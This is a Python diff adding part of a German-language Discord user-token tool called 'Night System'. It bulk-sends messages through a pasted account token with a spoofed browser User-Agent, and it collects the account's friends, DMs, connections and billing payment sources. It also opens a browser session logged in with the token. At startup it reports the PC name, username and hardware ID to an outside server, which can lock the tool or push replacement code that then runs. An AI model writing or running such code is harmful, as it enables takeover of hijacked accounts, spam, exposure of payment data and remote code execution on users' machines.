+                ])
+                return
+
+            self._append_bot_log(f"[INFO] {info_msg}")
+            self._append_bot_log(f"[START] Sende {total_count}x Nachrichten an Kanal {resolved_cid} (Intervall: {delay_sec}s)...")
+
+            success_cnt = 0
+            fail_cnt = 0
+
+            for i in range(1, total_count + 1):
+                if self.msg_stop_requested:
+                    self._append_bot_log("[STOP] Nachrichten-Versand manuell gestoppt.")
+                    break
+
+                if not self.token or "DEMO" in self.token:
+                    time.sleep(max(0.1, delay_sec))
+                    success_cnt += 1
+                    sim_rem = max(0, 5 - (i % 5))
+                    self._update_rate_limit_display(remaining=sim_rem, limit=5, reset_after="1.2", is_429=False)
+                    self._append_bot_log(f"[DEMO] Nachricht {i}/{total_count} gesendet an {resolved_cid}.")
+                else:
+                    url = f"https://discord.com/api/v9/channels/{resolved_cid}/messages"
+                    headers = {
+                        "Authorization": self.token,
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                        "Content-Type": "application/json"
+                    }
+                    payload = {
+                        "content": msg_text,
+                        "nonce": str(random.randint(100000000000000000, 999999999999999999)),
+                        "tts": False
+                    }
+
+                    try:
+                        res = requests.post(url, headers=headers, json=payload, timeout=6)
+
+                        rl_rem = res.headers.get("x-ratelimit-remaining", "5")
+                        rl_lim = res.headers.get("x-ratelimit-limit", "5")
+                        rl_reset = res.headers.get("x-ratelimit-reset-after", "0.0")
+
+                        if res.status_code in (200, 201):
+                            success_cnt += 1
+                            self._update_rate_limit_display(remaining=rl_rem, limit=rl_lim, reset_after=rl_reset, is_429=False)
+                            self._append_bot_log(f"[OK] Nachricht {i}/{total_count} gesendet. (Remaining: {rl_rem}/{rl_lim})")
+                        elif res.status_code == 429:
+                            try:
+                                retry_after = float(res.json().get("retry_after", 1.5))
+                            except Exception:
+                                retry_after = 1.5
+                            self._update_rate_limit_display(remaining="0", limit=rl_lim, reset_after=f"{retry_after:.1f}", is_429=True)
+                            self._append_bot_log(f"[RATE-LIMIT] 429 erreicht! Warte {retry_after:.1f}s Sicherheits-Pause...")
+                            time.sleep(retry_after)
+                            res_retry = requests.post(url, headers=headers, json=payload, timeout=6)
+                            if res_retry.status_code in (200, 201):
+                                success_cnt += 1
+                                self._append_bot_log(f"[OK] Nachricht {i}/{total_count} nach Rate-Limit gesendet.")
+                            else:
+                                fail_cnt += 1
+                        else:
+                            fail_cnt += 1
+                            err_msg = ""
+                            try:
+                                ej = res.json()
+                                err_msg = ej.get("message", "")
+                                ecode = ej.get("code")
+                                if ecode:
+                                    err_msg = f"{err_msg} (Code {ecode})"
+                            except Exception:
+                                err_msg = res.text[:80]
+                            if err_msg:
+                                self._append_bot_log(f"[FEHLER] Senden fehlgeschlagen (Status {res.status_code}: {err_msg}).")
+                            else:
+                                self._append_bot_log(f"[FEHLER] Senden fehlgeschlagen (Status {res.status_code}).")
+                    except Exception as ex:
+                        fail_cnt += 1
+                        self._append_bot_log(f"[FEHLER] Verbindungsfehler: {ex}")
+
+                if delay_sec > 0 and i < total_count and not self.msg_stop_requested:
+                    time.sleep(delay_sec)
+
+            self.msg_send_in_progress = False
+            self.msg_stop_requested = False
+            self.after(0, lambda: [
+                self.btn_send_msgs.configure(state="normal"),
+                self.btn_stop_msgs.configure(state="disabled", text="Stop"),
+                self._append_bot_log(f"[FERTIG] Versand beendet: {success_cnt} erfolgreich, {fail_cnt} fehlgeschlagen.")
+            ])
+
+        threading.Thread(target=_worker, daemon=True).start()
+
+    def _stop_send_messages(self):
+        self.msg_stop_requested = True
+        self.btn_stop_msgs.configure(text="Stoppe...", state="disabled")
+
+    def _update_rate_limit_display(self, remaining, limit, reset_after, is_429=False):
+        def _ui():
+            if not hasattr(self, "lbl_rl_badge"):
+                return
+            if is_429:
+                self.lbl_rl_badge.configure(text="RATE LIMIT AKTIV", fg_color=C["red_bg"], text_color=C["red_text"])
+                self.lbl_rl_status.configure(text=f"[WARNUNG] Rate Limit erreicht! Reset in {reset_after}s | Ban-Schutz aktiv", text_color=C["red_text"])
+            else:
+                self.lbl_rl_badge.configure(text="SICHER", fg_color=C["green_bg"], text_color=C["green"])
+                self.lbl_rl_status.configure(text=f"Verbleibend: {remaining} / {limit} Anfragen | Reset-Fenster: {reset_after}s | Status: 200 OK", text_color=C["text_sub"])
+        self.after(0, _ui)
+
+    # --------------------------------------------------------------------------
+    # 8. EXTRA-TAB: CLICK INSTANT (AUCH ALS EXTERNES FENSTER)
+    # --------------------------------------------------------------------------
+    def _build_click_instant_tab(self):
+        scroll = ctk.CTkScrollableFrame(self.frame_click_instant, fg_color="transparent")
+        scroll.pack(fill="both", expand=True)
+        self._populate_click_instant_ui(scroll, is_external=False)
+
+    def open_external_click_instant_window(self):
+        if self.external_click_instant_win is not None and self.external_click_instant_win.winfo_exists():
+            self.external_click_instant_win.lift()
+            self.external_click_instant_win.focus_force()
+            return
+
+        win = ctk.CTkToplevel(self)
+        self.external_click_instant_win = win
+        win.title("Night System - Click Instant (Extern)")
+        win.geometry("540x520")
+        win.minsize(460, 420)
+        win.configure(fg_color=C["bg"])
+        try:
+            win.attributes("-alpha", 0.94)
+            win.attributes("-topmost", True)
+        except Exception:
+            pass
+
+        icon_path = get_asset_path("icon.ico")
+        if icon_path and os.path.exists(icon_path):
+            try: win.iconbitmap(icon_path)
+            except Exception: pass
+
+        self._populate_click_instant_ui(win, is_external=True)
+
+    def _populate_click_instant_ui(self, parent, is_external=False):
+        container = ctk.CTkFrame(parent, fg_color="transparent")
+        container.pack(fill="both", expand=True, padx=16 if is_external else 0, pady=16 if is_external else 0)
+
+        card = ctk.CTkFrame(container, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
+        card.pack(fill="x", pady=(0, 12))
+
+        cin = ctk.CTkFrame(card, fg_color="transparent")
+        cin.pack(fill="x", padx=20, pady=18)
+
+        top_r = ctk.CTkFrame(cin, fg_color="transparent")
+        top_r.pack(fill="x")
+
+        title_txt = "Click Instant (Externes Fenster)" if is_external else "Click Instant"
+        ctk.CTkLabel(top_r, text=title_txt, font=("Segoe UI", 15, "bold"), text_color=C["text"]).pack(side="left")
+
+        tag_txt = "EXTERN" if is_external else "EXTRA TAB"
+        ctk.CTkLabel(top_r, text=tag_txt, font=("Segoe UI", 9.5, "bold"), fg_color=C["card_alt"], text_color=C["text_sub"], corner_radius=6, padx=8, pady=2).pack(side="right")
+
+        ctk.CTkLabel(cin, text="Automatischer Sofort-Klicker fuer Discord Buttons, Giveaways & Interaktionen.", font=("Segoe UI", 10.5), text_color=C["text_muted"]).pack(anchor="w", pady=(2, 10))
+
+        # Inputs
+        r1 = ctk.CTkFrame(cin, fg_color="transparent")
+        r1.pack(fill="x", pady=3)
+        ctk.CTkLabel(r1, text="Channel ID:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=110, anchor="w").pack(side="left")
+        e_cid = ctk.CTkEntry(r1, placeholder_text="Discord Channel ID", height=32, corner_radius=8, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])
+        e_cid.pack(side="left", fill="x", expand=True)
+
+        r2 = ctk.CTkFrame(cin, fg_color="transparent")
+        r2.pack(fill="x", pady=3)
+        ctk.CTkLabel(r2, text="Message ID:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=110, anchor="w").pack(side="left")
+        e_mid = ctk.CTkEntry(r2, placeholder_text="Message ID (optional / alle)", height=32, corner_radius=8, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])
+        e_mid.pack(side="left", fill="x", expand=True)
+
+        r3 = ctk.CTkFrame(cin, fg_color="transparent")
+        r3.pack(fill="x", pady=3)
+        ctk.CTkLabel(r3, text="Klick-Modus:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=110, anchor="w").pack(side="left")
+        opt_mode = ctk.CTkOptionMenu(r3, values=["Alle Buttons sofort klicken", "Ersten Button klicken", "Reactions klicken"], height=32, corner_radius=8, fg_color=C["card_alt"], button_color=C["card_border_hi"], text_color=C["text"])
+        opt_mode.pack(side="left", fill="x", expand=True)
+
+        r4 = ctk.CTkFrame(cin, fg_color="transparent")
+        r4.pack(fill="x", pady=3)
+        ctk.CTkLabel(r4, text="Reaktionszeit:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=110, anchor="w").pack(side="left")
+        opt_speed = ctk.CTkOptionMenu(r4, values=["0 ms (Sofort)", "25 ms (Ultra-Fast)", "50 ms (Fast)", "100 ms (Safe)"], height=32, corner_radius=8, fg_color=C["card_alt"], button_color=C["card_border_hi"], text_color=C["text"])
+        opt_speed.pack(side="left", fill="x", expand=True)
+
+        # Action Buttons
+        r_btns = ctk.CTkFrame(cin, fg_color="transparent")
+        r_btns.pack(fill="x", pady=(12, 0))
+
+        btn_start = ctk.CTkButton(r_btns, text="Instant Click Starten", font=("Segoe UI", 10.5, "bold"), fg_color=C["btn_gray"], hover_color=C["btn_gray_hover"], border_color=C["card_border_hi"], border_width=1, height=34, corner_radius=10)
+        btn_start.pack(side="left", padx=(0, 8))
+
+        btn_stop = ctk.CTkButton(r_btns, text="Stoppen", font=("Segoe UI", 10.5, "bold"), fg_color=C["red_bg"], text_color=C["red_text"], hover_color=C["red_hover"], border_color=C["red_border"], border_width=1, height=34, corner_radius=10)
+        btn_stop.pack(side="left", padx=(0, 8))
+
+        if not is_external:
+            btn_dock = ctk.CTkButton(r_btns, text="Externes Fenster oeffnen", font=("Segoe UI", 10.5, "bold"), fg_color=C["btn_gray"], hover_color=C["btn_gray_hover"], border_color=C["card_border_hi"], border_width=1, height=34, corner_radius=10, command=self.open_external_click_instant_window)
+            btn_dock.pack(side="right")
+
+        # Status & Log Box
+        card_log = ctk.CTkFrame(container, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
+        card_log.pack(fill="both", expand=True)
+
+        cl_in = ctk.CTkFrame(card_log, fg_color="transparent")
+        cl_in.pack(fill="both", expand=True, padx=20, pady=16)
+
+        ctk.CTkLabel(cl_in, text="Live-Trigger Log", font=("Segoe UI", 12, "bold"), text_color=C["text"]).pack(anchor="w")
+
+        txt_log = ctk.CTkTextbox(cl_in, height=140, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], border_width=1, text_color=C["text_sub"], font=("Consolas", 9.5))
+        txt_log.pack(fill="both", expand=True, pady=(8, 0))
+        txt_log.insert("end", "[READY] Click Instant Engine initialisiert.\n[INFO] Warte auf Komponenten-Trigger...\n")
+
+        def _do_start():
+            txt_log.insert("end", f"[START] Click Instant aktiv auf Channel {e_cid.get() or 'Alle'}\n")
+            txt_log.insert("end", f"[SPEED] Reaktionszeit: {opt_speed.get()}\n")
+            txt_log.see("end")
+
+        def _do_stop():
+            txt_log.insert("end", "[STOP] Click Instant angehalten.\n")
+            txt_log.see("end")
+
+        btn_start.configure(command=_do_start)
+        btn_stop.configure(command=_do_stop)
+
+    # --------------------------------------------------------------------------
+    # 9. WEITERE TABS (Verbindungen, Billing)
+    # --------------------------------------------------------------------------
+    def _build_conn_tab(self):
+        scroll = ctk.CTkScrollableFrame(self.frame_conn, fg_color="transparent")
+        scroll.pack(fill="both", expand=True)
+
+        lbl = ctk.CTkLabel(scroll, text=f"Verknuepfte Konten ({len(self.connections_data)})", font=("Segoe UI", 16, "bold"), text_color=C["text"])
+        lbl.pack(anchor="w", pady=(0, 10))
+
+        for c in self.connections_data:
+            c_type = c.get("type", "domain")
+            c_info = PLATFORM_ICONS.get(c_type, {"color": "#8b94a5", "tag": c_type[:2].upper(), "name": c_type.capitalize()})
+            card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])
+            card.pack(fill="x", pady=4)
+            ci = ctk.CTkFrame(card, fg_color="transparent")
+            ci.pack(fill="x", padx=16, pady=12)
+
+            tag_badge = ctk.CTkLabel(ci, text=c_info.get("tag", "LK"), font=("Segoe UI", 10.5, "bold"), text_color=C["text_sub"], width=36, height=36, fg_color=C["card_alt"], corner_radius=18)
+            tag_badge.pack(side="left", padx=(0, 10))
+
+            ctk.CTkLabel(ci, text=f"{c_info['name']}: {c.get('name')}", font=("Segoe UI", 12, "bold"), text_color=C["text"]).pack(side="left")
+            ctk.CTkLabel(ci, text="Verifiziert" if c.get("verified") else "Verknuepft", font=("Segoe UI", 9.5), text_color=C["green"] if c.get("verified") else C["text_muted"]).pack(side="right")
+
+    def _build_billing_tab(self):
+        scroll = ctk.CTkScrollableFrame(self.frame_billing, fg_color="transparent")
+        scroll.pack(fill="both", expand=True)
+
+        lbl = ctk.CTkLabel(scroll, text="Nitro & Zahlungsmethoden", font=("Segoe UI", 16, "bold"), text_color=C["text"])
+        lbl.pack(anchor="w", pady=(0, 10))
+
+        if not self.billing_data:
+            ctk.CTkLabel(scroll, text="Keine Zahlungsmethoden hinterlegt.", font=("Segoe UI", 11), text_color=C["text_muted"]).pack(anchor="w", pady=10)
+        else:
+            for b in self.billing_data:
+                card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])
+                card.pack(fill="x", pady=4)
+                ci = ctk.CTkFrame(card, fg_color="transparent")
+                ci.pack(fill="x", padx=16, pady=12)
+
+                b_type = b.get("type", 1)
+                b_name = "Kreditkarte" if b_type == 1 else "PayPal"
+                tag = "CC" if b_type == 1 else "PP"
+
+                tag_badge = ctk.CTkLabel(ci, text=tag, font=("Segoe UI", 10.5, "bold"), text_color=C["text_sub"], width=36, height=36, fg_color=C["card_alt"], corner_radius=18)
+                tag_badge.pack(side="left", padx=(0, 10))
+
+                ctk.CTkLabel(ci, text=f"{b_name} | {b.get('email') or b.get('brand', '').upper() + ' **** ' + str(b.get('last_4', ''))}", font=("Segoe UI", 12, "bold"), text_color=C["text"]).pack(side="left")
+
+    def _load_avatar_async(self):
+        uid = self.user_data.get("id")
+        av_hash = self.user_data.get("avatar")
+        if not uid or not av_hash:
+            return
+
+        def _fetch():
+            try:
+                url = f"https://cdn.discordapp.com/avatars/{uid}/{av_hash}.png?size=256"
+                r = requests.get(url, timeout=5)
+                if r.status_code == 200:
+                    pil = Image.open(io.BytesIO(r.content))
+                    round_pil = make_circle_avatar(pil, size=(80, 80))
+                    mini_pil = make_circle_avatar(pil, size=(40, 40))
+                    if round_pil:
+                        self.avatar_img_ctk = ctk.CTkImage(round_pil, size=(80, 80))
+                        self.after(0, lambda: self.lbl_hero_avatar.configure(image=self.avatar_img_ctk, text=""))
+                    if mini_pil:
+                        mini_ctk = ctk.CTkImage(mini_pil, size=(40, 40))
+                        self.after(0, lambda: self.lbl_side_avatar.configure(image=mini_ctk, text=""))
+            except Exception:
+                pass
+
+        threading.Thread(target=_fetch, daemon=True).start()
+
+    def launch_browser_login(self):
+        token = self.token.strip()
+        if not token:
+            return
+
+        username = self.user_data.get("username", "") or self.user_data.get("global_name", "")
+
+        if getattr(sys, 'frozen', False):
+            cmd = [sys.executable, "--browser", token, username]
+        else:
+            cmd = [sys.executable, os.path.abspath(__file__), "--browser", token, username]
+
+        try:
+            subprocess.Popen(cmd)
+        except Exception:
+            threading.Thread(target=run_browser_session, args=(token, username), daemon=True).start()
+
+
+def check_cloud_status_and_update():
+    """
+    Verbindet mit https://whatsapp-kadi.onrender.com/api/discord/heartbeat:
+    1. Prueft, ob das Tool ueber das Web-Dashboard gesperrt ist.
+    2. Prueft das Update-Manifest & Erkennt JEDE Datei-Aenderung (z.B. README.md, ff.py, discord_settings.json etc.).
+    3. Zeigt im Terminal / CMD einen animierten Fortschritts-Loader an und synchronisiert Dateien.
+    4. Registriert die Instanz im Cloud-Dashboard unter Aktive Instanzen.
+    """
+    import socket, platform, uuid, hashlib
+    pc_name = os.environ.get("COMPUTERNAME") or socket.gethostname() or "PC"
+    username = os.environ.get("USERNAME") or "Benutzer"
+    os_name = f"{platform.system()} {platform.release()}"
+    hwid = f"HWID-{uuid.getnode():012X}"
+
+    # Lokales Verzeichnis bestimmen
+    base_local_dir = os.path.dirname(os.path.abspath(sys.argv[0])) if sys.argv and sys.argv[0] else os.getcwd()
+    settings_file = os.path.join(base_local_dir, "discord_settings.json")
+    local_revision = 1
+    local_version = DISCORD_TOOL_VERSION
+
+    if os.path.exists(settings_file):
+        try:
+            with open(settings_file, "r", encoding="utf-8") as sf:
+                cfg = json.load(sf)
+                local_revision = cfg.get("installed_revision", cfg.get("revision", 1))
+                local_version = cfg.get("version", DISCORD_TOOL_VERSION)
+        except Exception:
+            pass
+
+    payload = {
+        "clientId": f"{pc_name}_{username}",
+        "hwid": hwid,
+        "pcName": pc_name,
+        "username": username,
+        "os": os_name,
+        "version": str(local_version),
+        "revision": local_revision
+    }
+
+    print("  ================================================================")
+    print("   NIGHT SYSTEM • DISCORD ENGINE v" + str(local_version))
+    print("  ================================================================")
+    print("  [*] Verbinde mit Cloud Dashboard (whatsapp-kadi.onrender.com)...")
+
+    cloud_info = {
+        "is_locked": False,
+        "lock_reason": "",
+        "update_available": False,
+        "latest_version": local_version,
+        "update_revision": local_revision,
+        "changelog": "",
+        "download_url": "https://whatsapp-kadi.onrender.com/download/Nightheid.exe",
+        "announcement": ""
+    }
+
+    try:
+        res = requests.post(f"{CLOUD_API_ENDPOINT}/heartbeat", json=payload, timeout=6)
+        if res.status_code == 200:
+            data = res.json()
+            is_locked = data.get("isLocked", False)
+            lock_reason = data.get("lockReason", "Wartungsarbeiten durch Administrator.")
+            latest_version = data.get("latestVersion", local_version)
+            update_revision = data.get("updateRevision", local_revision)
+            last_file = data.get("lastUpdatedFile", "System-Dateien")
+            update_available = data.get("updateAvailable", False)
+            changelog = data.get("changelog", "")
+            download_url = data.get("downloadUrl", "https://whatsapp-kadi.onrender.com/download/Nightheid.exe")
+            announcement = data.get("announcement", "")
+
+            cloud_info["is_locked"] = is_locked
+            cloud_info["lock_reason"] = lock_reason
+            cloud_info["update_available"] = update_available
+            cloud_info["latest_version"] = latest_version
+            cloud_info["update_revision"] = update_revision
+            cloud_info["changelog"] = changelog
+            cloud_info["download_url"] = download_url
+            cloud_info["announcement"] = announcement
+
+            if is_locked:
+                print(f"\n  [GESPERRT] Tool wurde ueber das Web-Dashboard gesperrt!")
+                print(f"  [GRUND] {lock_reason}")
+                print("  [STOP] Start abgebrochen. Bitte Administrator kontaktieren.\n")
+                try:
+                    import tkinter as tk
+                    from tkinter import messagebox
+                    root = tk.Tk()
+                    root.withdraw()
+                    messagebox.showerror(
+                        "Night System - Gesperrt",
+                        f"Dieses Tool wurde ueber das Web-Dashboard gesperrt!\n\nGrund: {lock_reason}\n\nBitte versuche es spaeter erneut."
+                    )
+                    root.destroy()
+                except Exception:
+                    pass
+                sys.exit(1)
+            else:
+                print("  [STATUS] Tool ist autorisiert und verbunden.")
+
+            # Manifest fuer dateigenaue Erkennung (auch kleinste Aenderungen z.B. in README.md)
+            manifest_files_to_sync = []
+            try:
+                m_res = requests.get(f"{CLOUD_API_ENDPOINT}/manifest", timeout=6)
+                if m_res.status_code == 200:
+                    m_data = m_res.json()
+                    server_files = m_data.get("files", [])
+                    for s_file in server_files:
+                        fn = s_file.get("name")
+                        f_id = s_file.get("id")
+                        s_hash = s_file.get("sha256")
+                        if fn.endswith(".zip"):
+                            continue
+
+                        if fn in ("icon.ico", "logo.png"):
+                            target_local = os.path.join(base_local_dir, "assets", fn)
+                        else:
+                            target_local = os.path.join(base_local_dir, fn)
+
+                        need_update = False
+                        if not os.path.exists(target_local):
+                            if fn in ("README.md", "discord_settings.json", "requirements.txt", "start_tool.bat", "build_standalone.bat"):
+                                need_update = True
+                        elif s_hash:
+                            try:
+                                with open(target_local, "rb") as tf:
+                                    local_hash = hashlib.sha256(tf.read()).hexdigest()
+                                if local_hash != s_hash:
+                                    need_update = True
+                            except Exception:
+                                need_update = True
+
+                        if need_update:
+                            manifest_files_to_sync.append({
+                                "name": fn,
+                                "id": f_id,
+                                "target": target_local,
+                                "size": s_file.get("size", 0),
+                                "is_py": fn == "ff.py",
+                                "is_exe": fn.endswith(".exe")
+                            })
+            except Exception:
+                pass
+
+            has_update = (update_available or len(manifest_files_to_sync) > 0 or update_revision > local_revision or str(latest_version).strip() != str(local_version).strip())
+
+            if has_update:
+                print("\n  ================================================================")
+                print("   NIGHT SYSTEM • UPDATE DETECTED! (AUTO-SYNC AKTIV)")
+                print("  ================================================================")
+                print(f"  [UPDATE] Neue Aenderungen auf dem Web-Server erkannt!")
+                print(f"           Version:          v{latest_version} (Lokal: v{local_version})")
+                print(f"           Revision:         #{update_revision} (Lokal: #{local_revision})")
+                print(f"           Zuletzt geaendert: {last_file}")
+                if changelog:
+                    first_line = changelog.split('\n')[0]
+                    print(f"           Changelog:        {first_line}")
+                print("  ----------------------------------------------------------------")
+                print("  [LOADER] Starte automatischen Download & Datei-Sync...\n")
+
+                def render_progress(step, total, filename, percent, action="SYNC"):
+                    bar_len = 24
+                    filled = int(bar_len * percent // 100)
+                    bar = "=" * filled + "-" * (bar_len - filled)
+                    sys.stdout.write(f"\r  [{step}/{total}] [{bar}] {percent:>3}% | {action}: {filename[:24]:<24}")
+                    sys.stdout.flush()
+
+                if not manifest_files_to_sync and last_file:
+                    target_local = os.path.join(base_local_dir, last_file)
+                    manifest_files_to_sync.append({
+                        "name": last_file,
+                        "id": f"discord_tool/{last_file}",
+                        "target": target_local,
+                        "size": 0,
+                        "is_py": last_file == "ff.py",
+                        "is_exe": last_file.endswith(".exe")
+                    })
+
+                total_items = max(1, len(manifest_files_to_sync))
+
+                for idx, item in enumerate(manifest_files_to_sync, 1):
+                    fn = item["name"]
+                    fid = item["id"]
+                    t_path = item["target"]
+
+                    for p in (15, 45, 80):
+                        render_progress(idx, total_items, fn, p)
+                        time.sleep(0.04)
+
+                    try:
+                        os.makedirs(os.path.dirname(t_path), exist_ok=True)
+                        file_url = f"{CLOUD_API_ENDPOINT}/file-content?id={fid}&download=1"
+                        f_resp = requests.get(file_url, timeout=15)
+                        if f_resp.status_code == 200:
+                            if item["is_exe"] and getattr(sys, "frozen", False):
+                                temp_exe = t_path + ".new"
+                                with open(temp_exe, "wb") as out_f:
+                                    out_f.write(f_resp.content)
+                            else:
+                                with open(t_path, "wb") as out_f:
+                                    out_f.write(f_resp.content)
+                            render_progress(idx, total_items, fn, 100)
+                            sys.stdout.write(" [OK]\n")
+                        else:
+                            render_progress(idx, total_items, fn, 100, action="SKIP")
+                            sys.stdout.write(" [SKIP]\n")
+                    except Exception as dl_err:
+                        sys.stdout.write(f" [FEHLER: {dl_err}]\n")
+
+                # Lokale settings.json aktualisieren
+                try:
+                    cur_settings = {}
+                    if os.path.exists(settings_file):
+                        with open(settings_file, "r", encoding="utf-8") as sf:
+                            cur_settings = json.load(sf)
+                    cur_settings["version"] = str(latest_version)
+                    cur_settings["installed_revision"] = int(update_revision)
+                    cur_settings["last_sync"] = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
+                    with open(settings_file, "w", encoding="utf-8") as sf:
+                        json.dump(cur_settings, sf, indent=2)
+                except Exception:
+                    pass
+
+                print("\n  ----------------------------------------------------------------")
+                print(f"  [ERFOLG] Alle Dateien wurden auf Version v{latest_version} (Rev #{update_revision}) aktualisiert!")
+                print("  ================================================================\n")
+                time.sleep(0.6)
+
+                if any(it["is_py"] for it in manifest_files_to_sync) and not getattr(sys, "frozen", False):
+                    print("  [RELOAD] Hauptprogramm aktualisiert. Starte Prozess neu...\n")
+                    time.sleep(0.5)
+                    os.execv(sys.executable, [sys.executable] + sys.argv)
+            else:
+                print(f"  [UPDATE-CHECK] Tool ist auf dem neuesten Stand (v{DISCORD_TOOL_VERSION}, Rev #{local_revision}). [OK]\n")
+
+            if announcement:
+                print(f"  [BROADCAST] {announcement}\n")
+    except Exception as ex:
+        print(f"  [HINWEIS] Cloud Dashboard offline oder nicht erreichbar ({ex}).")
+        print(f"  [OFFLINE] Lokaler Modus aktiv (v{DISCORD_TOOL_VERSION}).\n")
+
+    return cloud_info
+
+# ==============================================================================
+#  TERMINAL VALIDATOR & PROGRESS LOADER (Ohne Emojis)
+# ==============================================================================
+def validate_and_load_in_terminal(preset_token=None):
+    try:
+        import ctypes
+        ctypes.windll.kernel32.SetConsoleTitleW("Night System - Token Loader Pro")
+        ctypes.windll.kernel32.SetConsoleOutputCP(65001)
+        ctypes.windll.kernel32.SetConsoleCP(65001)
+    except Exception:
+        pass
+
+    if os.name == "nt":
+        os.system("color")
+        os.system("cls")
+    else:
+        os.system("clear")
+
+    cloud_info = check_cloud_status_and_update()
+
+    print("  [Night System] Bitte Discord-Token einfuegen / eingeben:\n")
+
+    token = ""
+    user_data = {}
+    connections_data = []
+    guilds_data = []
+    billing_data = []
+    friends_data = []
+    user_to_channel_map = {}
+
+    while True:
+        if preset_token:
+            token = preset_token.strip()
+            preset_token = None
+        else:
+            try:
+                token = input("  Token: ").strip()
+            except (EOFError, KeyboardInterrupt):
+                sys.exit(0)
+
+        if (token.startswith('"') and token.endswith('"')) or (token.startswith("'") and token.endswith("'")):
+            token = token[1:-1].strip()
+
+        # Demo Fallback
+        if not token or token.lower() == "demo":
+            print("\n  [*] Demo-Modus aktiviert.")
+            user_data = DEMO_DATA["user"]
+            connections_data = DEMO_DATA["connections"]
+            guilds_data = DEMO_DATA["guilds"]
+            billing_data = DEMO_DATA["billing"]
+            friends_data = DEMO_DATA["friends"]
+            user_to_channel_map = DEMO_DATA["user_to_channel_map"]
+            token = "mfa.VkO_2G4Qv3T...DEMO_TOKEN..."
+            break
+
+        print("  [*] Ueberpruefe Token mit Discord API...")
+        headers = {"Authorization": token}
+        try:
+            r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=8)
+            if r.status_code == 200:
+                user_data = r.json()
+                print(f"  [OK] Token gueltig! (Eingeloggt als @{user_data.get('username')})")
+
+                try:
+                    rc = requests.get("https://discord.com/api/v10/users/@me/connections", headers=headers, timeout=5)
+                    connections_data = rc.json() if rc.status_code == 200 else []
+                except Exception: connections_data = []
+
+                try:
+                    rg = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers, timeout=5)
+                    guilds_data = rg.json() if rg.status_code == 200 else []
+                except Exception: guilds_data = []
+
+                try:
+                    rb = requests.get("https://discord.com/api/v10/users/@me/billing/payment-sources", headers=headers, timeout=5)
+                    billing_data = rb.json() if rb.status_code == 200 else []
+                except Exception: billing_data = []
+
+                try:
+                    fresh_f = []
+                    rf = requests.get("https://discord.com/api/v10/users/@me/relationships", headers=headers, timeout=5)
+                    if rf.status_code == 200:
+                        for item in rf.json():
+                            u_info = item.get("user", {})
+                            fresh_f.append({
+                                "id": str(item.get("id", u_info.get("id"))),
+                                "name": u_info.get("global_name") or u_info.get("username", "Freund"),
+                                "username": u_info.get("username", ""),
+                                "type_name": "Freund" if item.get("type") == 1 else ("Anfrage" if item.get("type") in (3, 4) else "Blockiert"),
+                                "is_group": False
+                            })
+                    rc = requests.get("https://discord.com/api/v10/users/@me/channels", headers=headers, timeout=5)
+                    if rc.status_code == 200:
+                        for ch in rc.json():
+                            ch_type = ch.get("type")
+                            recips = ch.get("recipients", [])
+                            recip_names = ", ".join([rcp.get("username", "") for rcp in recips[:3]])
+                            if ch_type == 3:
+                                g_name = ch.get("name") or (f"Gruppe ({recip_names})" if recip_names else "Gruppe")
+                                fresh_f.append({
+                                    "id": str(ch.get("id")),
+                                    "name": g_name,
+                                    "username": f"{len(recips)} Mitglieder",
+                                    "type_name": "Gruppe",
+                                    "is_group": True
+                                })
+                            elif ch_type == 1 and recips:
+                                dm_uid = str(recips[0].get("id"))
+                                user_to_channel_map[dm_uid] = str(ch.get("id"))
+                                if not any(f["id"] == dm_uid for f in fresh_f):
+                                    fresh_f.append({
+                                        "id": str(ch.get("id")),
+                                        "name": recips[0].get("global_name") or recips[0].get("username", "DM"),
+                                        "username": recips[0].get("username", ""),
+                                        "type_name": "DM",
+                                        "is_group": True
+                                    })
+                    friends_data = fresh_f
+                except Exception:
+                    friends_data = []
+
+                break
+            else:
+                print(f"  [FEHLER] Token ist ungueltig (Status {r.status_code})! Bitte erneut versuchen.\n")
+        except Exception as e:
+            print(f"  [FEHLER] Verbindungsfehler ({e})! Bitte erneut versuchen.\n")
+
+    # Loader im Terminal
+    print("\n  " + "-" * 55)
+    loader_steps = [
+        "Verifiziere Discord-Sitzung...",
+        "Lade Benutzerprofil & Badges...",
+        "Synchronisiere Server, Freunde & DMs...",
+        "Initialisiere Glassmorphism UI..."
+    ]
+    for step in loader_steps:
+        print(f"  [>] {step:<42} [OK]")
+        time.sleep(0.3)
+
+    print("  [OK] Bereit! Oeffne Benutzeroberflaeche...\n")
+    time.sleep(0.4)
+
+    return user_data, connections_data, guilds_data, billing_data, friends_data, user_to_channel_map, token, cloud_info
+
+
+# ==============================================================================
+#  ENTRY POINT
+# ==============================================================================
+if __name__ == "__main__":
+    if len(sys.argv) > 1 and sys.argv[1] == "--browser":
+        try:
+            import ctypes
+            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+            if hwnd:
+                ctypes.windll.user32.ShowWindow(hwnd, 0)
+        except Exception:
+            pass
+        t = sys.argv[2] if len(sys.argv) > 2 else ""
+        u = sys.argv[3] if len(sys.argv) > 3 else ""
+        run_browser_session(t, u)
+        sys.exit(0)
+    elif len(sys.argv) > 1 and sys.argv[1] == "--token":
+        t = sys.argv[2] if len(sys.argv) > 2 else ""
+        u_data, c_data, g_data, b_data, f_data, u_ch_map, active_token, c_info = validate_and_load_in_terminal(preset_token=t)
+        app = App(
+            user_data=u_data,
+            connections_data=c_data,
+            guilds_data=g_data,
+            billing_data=b_data,
+            friends_data=f_data,
+            user_to_channel_map=u_ch_map,
+            token=active_token,
+            cloud_info=c_info
+        )
